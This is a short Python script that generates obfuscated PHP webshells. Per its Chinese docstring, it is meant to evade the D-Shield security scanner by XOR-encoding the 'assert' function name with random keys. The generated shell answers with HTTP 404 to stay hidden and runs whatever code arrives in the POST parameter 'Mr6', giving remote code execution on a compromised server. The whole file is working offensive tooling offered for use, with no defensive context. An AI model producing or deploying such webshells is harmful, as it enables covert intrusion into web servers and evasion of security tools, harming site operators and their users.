#coding=utf-8
import random

'''
shell autor: Mr6
code autor: c0ny1<root@gv7.me>
date: 2019-05-29 11:56
description: 生成利用随机异或可无限免杀d盾的webshell
reference: https://github.com/yzddmr6/php_xor_bypass/
github: https://github.com/c0ny1/WorkScripts/tree/master/php_xor_bypass/
'''

func = 'assert'
shell = '''<?php 
header('HTTP/1.1 404');
class  {0}{2}
${1}=new {0}();
@${1}->c=$_POST['Mr6'];
?>'''

def random_keys(len):
    str = '`~-=!@#$%^&*_/+?<>{}|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))

    
def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))   
    
    
def xor(c1,c2):
    n1 = ord(c1)
    n2 = ord(c2)
    n3 = n1^n2
    return chr(n3)

    
def build_func():
    func_line = ''
    key = random_keys(len(func))
    call = '$db='
    for i in range(0,len(func)):
        enc = xor(func[i],key[i])
        func_line += "$_%d='%s'^\"\\x%s\";" % (i,key[i],enc.encode('hex'))
        func_line += '\n'
        call += '$_%d.' % i
    func_line = func_line.rstrip('\n')
    call = call.rstrip('.') + ';'
    
    func_tmpl = '''{ 
public $c='';
function __destruct(){
%s
%s
@$db ("$this->c");}}''' % (func_line,call)
    return func_tmpl

    
def build_webshell():
    className = random_name(4)
    objName = className.lower()
    func = build_func()
    shellc = shell.format(className,objName,func)
    return shellc
    
if __name__ == '__main__':
    print build_webshell()